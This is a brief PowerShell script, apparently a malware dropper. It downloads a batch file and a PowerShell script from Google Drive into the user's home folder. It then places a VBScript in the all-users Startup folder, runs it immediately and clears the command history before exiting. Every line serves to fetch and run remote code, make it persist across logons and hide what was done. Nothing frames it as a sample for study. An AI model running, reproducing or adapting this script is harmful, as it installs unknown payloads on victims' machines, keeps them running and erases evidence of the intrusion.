cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1_54rHfMMBq4MGkEY8nkjCFH7RX2Xu_wO" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1FXPoDSgpxNp68rj2AMGP9jqFcvaL6WcO" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1k6wrAsAnJt8B7g6jEAShyG56xVoebwpX" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit